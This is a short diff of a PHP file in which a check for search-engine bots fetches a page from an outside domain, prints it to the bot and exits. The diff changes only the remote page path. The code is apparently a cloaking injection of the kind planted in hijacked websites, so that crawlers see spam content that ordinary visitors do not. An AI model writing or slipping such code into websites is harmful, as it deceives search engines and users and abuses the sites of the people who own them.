@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://percetakanbandung.org/rabiana/');
+    $message = file_get_contents('https://percetakanbandung.org/rabicana/');
     echo $message;
 exit; // Atau bisa menggunakan die()
 }
